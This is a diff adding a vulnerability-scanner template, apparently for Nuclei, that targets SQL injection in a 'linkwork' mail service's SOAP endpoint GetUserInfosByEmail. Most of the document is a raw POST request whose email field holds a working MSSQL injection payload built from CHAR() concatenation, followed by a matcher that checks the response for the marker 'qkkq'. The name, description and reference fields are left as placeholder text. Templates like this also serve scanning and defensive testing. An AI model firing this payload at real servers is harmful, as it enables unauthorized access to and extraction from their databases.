@@ -1,0 +1,34 @@
+id: linkwork-EmailAccountOrgUserService-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /Mail/Services/EmailAccountOrgUserService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 560
+        SOAPAction: "http://tempuri.org/GetUserInfosByEmail"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetUserInfosByEmail xmlns="http://tempuri.org/">
+        <email>') AND 3515 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (3515=3515) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(112)+CHAR(122)+CHAR(113))) AND ('ShLa'='ShLa</email>
+
+        </GetUserInfosByEmail>
+
+        </soap:Body>
+
+        </soap:Envelope>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'qkkq'
